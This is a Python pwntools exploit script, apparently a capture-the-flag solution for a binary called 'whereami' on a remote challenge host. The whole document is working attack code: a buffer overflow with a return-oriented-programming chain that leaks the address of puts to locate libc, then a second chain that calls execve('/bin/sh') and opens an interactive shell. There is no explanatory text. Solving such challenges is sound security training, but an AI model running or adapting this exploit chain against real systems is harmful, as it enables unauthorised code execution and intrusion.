from pwn import *
HOST = 'challs.actf.co'
PORT = 31222
EXE  = './whereami'
r = remote(HOST, PORT)
libc = ELF('./libc.so.6')
exe = ELF(EXE)

pop_rdi = 0x401303
counter = 0x40406c
pop_pad_rbx_rbp_r12_r13_r14_r15 = 0x4012f6
add_dword_rbp_minux_3d_ebx = 0x4011dc
ret = 0x4011e0

offset  = libc.symbols['puts']
r.recvuntil(b'you?')
r.recv(1)

print("got puts: " + hex(exe.got['puts']))
print("plt puts: " + hex(exe.plt['puts']))

payload  = b'A'*72
payload += p64(pop_pad_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)
payload += p64(0xffffffff)
payload += p64(counter + 0x3d)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(add_dword_rbp_minux_3d_ebx)
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(ret)
payload += p64(exe.symbols['main'])
r.sendline(payload)

r.recvline() # get rid of unwanted output
leak = r.recv(6) + b'\x00\x00'
print(leak)
leak = u64(leak)
print("leaked puts: " + hex(leak))

r.recvuntil(b'you?') # read past first two lines
r.recv(1)

pop_rsi         = 0x196dc0
pop_rdx_rcx_rbx = 0x1025ad
xor_rax         = 0x190ae0
syscall         = 0x198ce6
inc_rax         = 0xcfb20

libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']
print("libc address: " + hex(libc.address))

print("binsh:  " + hex(binsh))
print("null:   " + hex(nullptr))
print("execve: " + hex(execve))

payload  = b'A'*72
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address + pop_rdx_rcx_rbx)
payload += p64(nullptr)
payload += p64(nullptr)
payload += p64(nullptr)
payload += p64(execve)
r.sendline(payload)
r.interactive()